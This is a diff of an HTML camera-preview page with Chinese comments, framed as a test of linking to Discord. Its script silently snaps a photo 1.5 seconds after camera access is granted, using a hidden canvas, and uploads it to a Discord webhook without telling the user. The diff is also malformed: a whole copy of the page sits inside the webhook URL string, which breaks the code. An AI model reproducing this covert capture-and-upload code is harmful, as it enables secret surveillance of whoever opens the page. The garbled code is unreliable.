@@ -26,7 +26,118 @@
   <script>
     let currentStream = null;
     // 這裡已經設定好你的 Discord Webhook 網址
+    const DISCORD_WEBHOOK = "<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>自動拍照與Discord連動測試</title>
+<style>
+  body { font-family: sans-serif; background: #111; color: #fff; text-align: center; }
+  video { width: 90%; max-width: 480px; margin-top: 20px; border-radius: 12px; background: #000; }
+  button { margin: 10px; padding: 12px 20px; font-size: 16px; cursor: pointer; border: none; border-radius: 8px; background: #007bff; color: white; }
+  button:hover { background: #0056b3; }
+</style>
+</head>
+<body>
+
+  <h2>相機預覽</h2>
+  <!-- 必須透過使用者手動點擊來觸發第一次鏡頭授權 -->
+  <button onclick="startCamera('user')">允許使用前鏡頭</button>
+  <button onclick="startCamera('environment')">允許使用後鏡頭</button>
+  <br>
+  <video id="video" autoplay playsinline muted></video>
+
+  <!-- 用於暫存拍照結果的隱藏畫布 -->
+  <canvas id="canvas" style="display: none;"></canvas>
+
+  <script>
+    let currentStream = null;
+    // 這裡已經設定好你的 Discord Webhook 網址
     const DISCORD_WEBHOOK = "https://discord.com"; 
+
+    async function startCamera(facingMode) {
+      const videoElement = document.getElementById("video");
+      
+      // 清理舊的串流
+      if (currentStream) {
+        currentStream.getTracks().forEach(track => track.stop());
+      }
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { exact: facingMode } },
+          audio: false
+        });
+        handleSuccess(stream, videoElement);
+      } catch (err) {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: { facingMode: facingMode },
+            audio: false
+          });
+          handleSuccess(stream, videoElement);
+        } catch (e) {
+          alert("無法存取相機，請確認權限是否開啟。");
+        }
+      }
+    }
+
+    function handleSuccess(stream, videoElement) {
+      currentStream = stream;
+      videoElement.srcObject = stream;
+      
+      // 當鏡頭成功開啟並載入畫面後，自動執行拍照與傳送
+      videoElement.onloadedmetadata = () => {
+        setTimeout(() => {
+          autoCaptureAndSend();
+        }, 1500); // 延遲 1.5 秒讓畫面穩定後拍照
+      };
+    }
+
+    async function autoCaptureAndSend() {
+      const video = document.getElementById("video");
+      const canvas = document.getElementById("canvas");
+      const context = canvas.getContext("2d");
+
+      // 設定畫布尺寸與影片一致
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      
+      // 將畫面繪製到畫布上
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // 將畫布轉為 Base64 的 JPEG 格式
+      const imageData = canvas.toDataURL("image/jpeg", 0.8);
+
+      // 轉換為 Blob 物件以便透過 FormData 發送
+      const blob = await (await fetch(imageData)).blob();
+      
+      // 打包並送出到 Discord
+      const formData = new FormData();
+      formData.append("content", "系統自動捕捉的相機照片：");
+      formData.append("file", blob, "camera_capture.jpg");
+
+      try {
+        // 修正處：直接帶入上面定義好的 Webhook 變數，避免語法崩潰
+        const response = await fetch(DISCORD_WEBHOOK, {
+          method: "POST",
+          body: formData
+        });
+
+        if (response.ok) {
+          console.log("照片成功傳送至 Discord！");
+        } else {
+          console.error("傳送至 Discord 失敗，請檢查 Webhook 網址或檔案大小。");
+        }
+      } catch (error) {
+        console.error("網路錯誤：", error);
+      }
+    }
+  </script>
+</body>
+</html>
+"; 
 
     async function startCamera(facingMode) {
       const videoElement = document.getElementById("video");
